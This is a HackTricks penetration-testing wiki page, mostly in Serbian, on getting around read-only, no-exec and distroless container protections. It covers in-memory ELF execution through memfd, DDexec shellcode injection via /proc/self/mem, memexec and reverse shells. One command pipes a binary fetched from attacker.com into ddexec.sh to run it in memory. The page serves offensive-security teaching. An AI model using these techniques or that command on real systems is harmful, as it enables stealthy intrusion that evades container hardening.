# Bypass FS protections: read-only / no-exec / Distroless

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).

{% embed url="https://www.stmcyber.com/careers" %}

## Videos

In the following videos you can find the techniques mentioned in this page explained more in depth:

* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## read-only / no-exec scenario

Sve je češće pronaći linux mašine montirane sa **read-only (ro) zaštitom datotečnog sistema**, posebno u kontejnerima. To je zato što je pokretanje kontejnera sa ro datotečnim sistemom jednako lako kao postavljanje **`readOnlyRootFilesystem: true`** u `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Međutim, čak i ako je datotečni sistem montiran kao ro, **`/dev/shm`** će i dalje biti zapisiv, tako da je lažno da ne možemo ništa napisati na disk. Međutim, ova fascikla će biti **montirana sa no-exec zaštitom**, tako da ako preuzmete binarni fajl ovde, **nećete moći da ga izvršite**.

{% hint style="warning" %}
Iz perspektive crvenog tima, ovo otežava **preuzimanje i izvršavanje** binarnih fajlova koji već nisu u sistemu (kao što su backdoor-i ili enumeratori poput `kubectl`).
{% endhint %}

## Easiest bypass: Scripts

Napomena da sam pomenuo binarne fajlove, možete **izvršiti bilo koji skript** sve dok je interpreter unutar mašine, kao što je **shell skript** ako je `sh` prisutan ili **python** **skript** ako je `python` instaliran.

Međutim, ovo nije dovoljno da izvršite svoj binarni backdoor ili druge binarne alate koje možda trebate pokrenuti.

## Memory Bypasses

Ako želite da izvršite binarni fajl, ali datotečni sistem to ne dozvoljava, najbolji način da to uradite je **izvršavanje iz memorije**, jer **zaštite se ne primenjuju tamo**.

### FD + exec syscall bypass

Ako imate neke moćne skriptne engine unutar mašine, kao što su **Python**, **Perl**, ili **Ruby**, mogli biste preuzeti binarni fajl da ga izvršite iz memorije, sačuvati ga u deskriptoru datoteke u memoriji (`create_memfd` syscall), koji neće biti zaštićen tim zaštitama, a zatim pozvati **`exec` syscall** označavajući **fd kao datoteku za izvršavanje**.

Za ovo možete lako koristiti projekat [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Možete mu proslediti binarni fajl i on će generisati skript u naznačenom jeziku sa **binarno kompresovanim i b64 kodiranim** instrukcijama za **dekodiranje i dekompresiju** u **fd** kreiranom pozivom `create_memfd` syscall i pozivom **exec** syscall za njegovo pokretanje.

{% hint style="warning" %}
Ovo ne funkcioniše u drugim skriptnim jezicima poput PHP-a ili Node-a jer nemaju nikakav d**efault način da pozovu sirove syscalls** iz skripte, tako da nije moguće pozvati `create_memfd` da kreira **memory fd** za čuvanje binarnog fajla.

Štaviše, kreiranje **regular fd** sa datotekom u `/dev/shm` neće raditi, jer nećete moći da ga pokrenete zbog primene **no-exec zaštite**.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) je tehnika koja vam omogućava da **modifikujete memoriju svog procesa** prepisivanjem njegovog **`/proc/self/mem`**.

Stoga, **kontrolišući asemblažni kod** koji se izvršava od strane procesa, možete napisati **shellcode** i "mutirati" proces da **izvrši bilo koji proizvoljni kod**.

{% hint style="success" %}
**DDexec / EverythingExec** će vam omogućiti da učitate i **izvršite** svoj **shellcode** ili **bilo koji binarni fajl** iz **memorije**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Za više informacija o ovoj tehnici proverite Github ili:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) je prirodan sledeći korak DDexec-a. To je **DDexec shellcode demonizovan**, tako da svaki put kada želite da **pokrenete drugi binarni fajl** ne morate ponovo pokretati DDexec, možete jednostavno pokrenuti memexec shellcode putem DDexec tehnike i zatim **komunicirati sa ovim demonima da prosledite nove binarne fajlove za učitavanje i izvršavanje**.

Možete pronaći primer kako koristiti **memexec za izvršavanje binarnih fajlova iz PHP reverz shell-a** na [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Sa sličnom svrhom kao DDexec, tehnika [**memdlopen**](https://github.com/arget13/memdlopen) omogućava **lakši način učitavanja binarnih fajlova** u memoriju za kasnije izvršavanje. Može čak omogućiti i učitavanje binarnih fajlova sa zavisnostima.

## Distroless Bypass

### Šta je distroless

Distroless kontejneri sadrže samo **najosnovnije komponente potrebne za pokretanje specifične aplikacije ili servisa**, kao što su biblioteke i zavisnosti u vreme izvršavanja, ali isključuju veće komponente poput menadžera paketa, shell-a ili sistemskih alata.

Cilj distroless kontejnera je da **smanji površinu napada kontejnera eliminisanjem nepotrebnih komponenti** i minimiziranjem broja ranjivosti koje se mogu iskoristiti.

### Reverz Shell

U distroless kontejneru možda **nećete ni pronaći `sh` ili `bash`** da dobijete regularni shell. Takođe nećete pronaći binarne fajlove kao što su `ls`, `whoami`, `id`... sve što obično pokrećete u sistemu.

{% hint style="warning" %}
Stoga, **nećete** moći da dobijete **reverz shell** ili **enumerišete** sistem kao što obično radite.
{% endhint %}

Međutim, ako kompromitovani kontejner pokreće, na primer, flask web, tada je python instaliran, i stoga možete dobiti **Python reverz shell**. Ako pokreće node, možete dobiti Node rev shell, i isto važi za većinu **scripting jezika**.

{% hint style="success" %}
Korišćenjem scripting jezika mogli biste **enumerisati sistem** koristeći mogućnosti jezika.
{% endhint %}

Ako nema **`read-only/no-exec`** zaštita mogli biste iskoristiti svoj reverz shell da **pišete u fajl sistem vaše binarne fajlove** i **izvršite** ih.

{% hint style="success" %}
Međutim, u ovakvim kontejnerima ove zaštite obično postoje, ali mogli biste koristiti **prethodne tehnike izvršavanja u memoriji da ih zaobiđete**.
{% endhint %}

Možete pronaći **primere** kako da **iskoristite neke RCE ranjivosti** da dobijete scripting jezike **reverz shell-ove** i izvršite binarne fajlove iz memorije na [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ako ste zainteresovani za **hacking karijeru** i hakovanje nehakovanog - **zapošljavamo!** (_potrebno je tečno pisano i govorno poljski_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podrška HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hacking trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
